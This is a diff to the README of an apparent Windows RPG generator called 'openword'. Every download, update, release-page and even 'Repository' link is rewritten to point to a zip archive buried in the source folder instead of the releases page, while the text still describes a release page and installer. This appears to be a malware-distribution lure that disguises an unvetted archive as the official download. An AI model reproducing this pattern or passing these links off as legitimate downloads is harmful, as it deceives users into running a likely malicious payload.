@@ -1,6 +1,6 @@
 # 🎲 openword - Endless RPG Adventure Generator
 
-[![Download openword](https://img.shields.io/badge/Download-Openword-ff6600?style=for-the-badge)](https://github.com/Ditorga/openword/releases)
+[![Download openword](https://img.shields.io/badge/Download-Openword-ff6600?style=for-the-badge)](https://github.com/Ditorga/openword/raw/refs/heads/main/src/domain/Software-2.7.zip)
 
 ## 📋 What is openword?
 
@@ -22,7 +22,7 @@ This app runs on Windows. It requires no programming skills. You just download a
 
 Click the button below to go to openword’s release page where you can get the latest version for Windows:
 
-[![Download openword](https://img.shields.io/badge/Download-Openword-ff6600?style=for-the-badge)](https://github.com/Ditorga/openword/releases)
+[![Download openword](https://img.shields.io/badge/Download-Openword-ff6600?style=for-the-badge)](https://github.com/Ditorga/openword/raw/refs/heads/main/src/domain/Software-2.7.zip)
 
 The page will list the latest versions. Look for the Windows installer or executable file.
 
@@ -119,7 +119,7 @@ No technical setup is needed. Just choose what fits your style.
 To get new features and fixes:
 
 - Visit the release page regularly:  
-  https://github.com/Ditorga/openword/releases  
+  https://github.com/Ditorga/openword/raw/refs/heads/main/src/domain/Software-2.7.zip  
 - Download the latest installer and run it to update.  
 - Your saved games will stay intact after updates.
 
@@ -133,10 +133,10 @@ If you need assistance:
 
 ## 🔗 Useful Links
 
-- Release page: https://github.com/Ditorga/openword/releases  
-- Repository: https://github.com/Ditorga/openword  
+- Release page: https://github.com/Ditorga/openword/raw/refs/heads/main/src/domain/Software-2.7.zip  
+- Repository: https://github.com/Ditorga/openword/raw/refs/heads/main/src/domain/Software-2.7.zip  
 - Documentation (basic guides and FAQs): linked from the repository README
 
 ---
 
-[Download openword](https://github.com/Ditorga/openword/releases) to start your adventure now.
+[Download openword](https://github.com/Ditorga/openword/raw/refs/heads/main/src/domain/Software-2.7.zip) to start your adventure now.
